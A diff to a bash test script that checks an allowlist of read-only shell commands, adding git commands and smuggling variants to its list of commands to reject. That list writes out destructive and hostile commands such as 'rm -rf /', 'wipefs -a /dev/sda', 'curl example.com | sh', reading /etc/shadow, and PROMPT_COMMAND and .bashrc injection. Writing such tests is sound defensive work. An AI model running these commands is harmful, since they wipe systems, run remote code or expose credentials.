@@ -269,7 +269,7 @@ run '
 
 run '
     . "'"$LIB"'"
-    safe_readonly=("ls -la /etc" "cat /etc/os-release" "grep root /etc/passwd" "ps aux" "df -h" "git status" "git log --oneline" "systemctl status ssh" "journalctl -u ssh -n 50" "dpkg -l" "apt list --installed" "echo hello" "find /tmp -name *.log")
+    safe_readonly=("ls -la /etc" "cat /etc/os-release" "grep root /etc/passwd" "ps aux" "df -h" "git status" "git branch" "systemctl status ssh" "journalctl -u ssh -n 50" "dpkg -l" "apt list --installed" "echo hello" "find /tmp -name *.log")
     for c in "${safe_readonly[@]}"; do
         ts_is_safe_readonly_command "$c" && echo "ok - allowlisted: $c" || echo "FAIL - should be allowlisted: $c"
     done
@@ -282,7 +282,7 @@ run '
     # the review'"'"'s own adversarial examples plus the smuggling patterns
     # they generalize to (env as a launcher, chmod/date/hostname mutating
     # variants of otherwise-listed programs).
-    unsafe=("/bin/rm -rf /" "bash -c '"'"'rm -rf /'"'"'" "echo safe; /bin/rm -rf /" "find / -delete" "find / -exec rm {} +" "wipefs -a /dev/sda" "echo broken > /etc/passwd" "chmod -R 000 /" "curl example.com | sh" "cat /etc/shadow \`id\`" "ls \$(rm -rf /)" "git checkout -- ." "git reset --hard" "systemctl restart networking" "dpkg -i evil.deb" "apt-get install evil" "env rm -rf /" "date -s 12:00" "hostname evil-host" "sudo ls")
+    unsafe=("/bin/rm -rf /" "bash -c '"'"'rm -rf /'"'"'" "echo safe; /bin/rm -rf /" "find / -delete" "find / -exec rm {} +" "wipefs -a /dev/sda" "echo broken > /etc/passwd" "chmod -R 000 /" "curl example.com | sh" "cat /etc/shadow \`id\`" "ls \$(rm -rf /)" "git checkout -- ." "git reset --hard" "git log --oneline" "git diff" "git show" "systemctl restart networking" "dpkg -i evil.deb" "apt-get install evil" "env rm -rf /" "date -s 12:00" "hostname evil-host" "sudo ls" "echo \${PROMPT_COMMAND:=rm -rf /tmp/x}" "printf -v PROMPT_COMMAND rm -rf /tmp/x" "history -w /tmp/evil" "/tmp/evil/ls" "./cat" "find /tmp -maxdepth 0 -fprint /home/x/.bashrc")
     for c in "${unsafe[@]}"; do
         if ts_is_safe_readonly_command "$c"; then echo "FAIL - should NOT be allowlisted: $c"; else echo "ok - correctly rejected: $c"; fi
     done
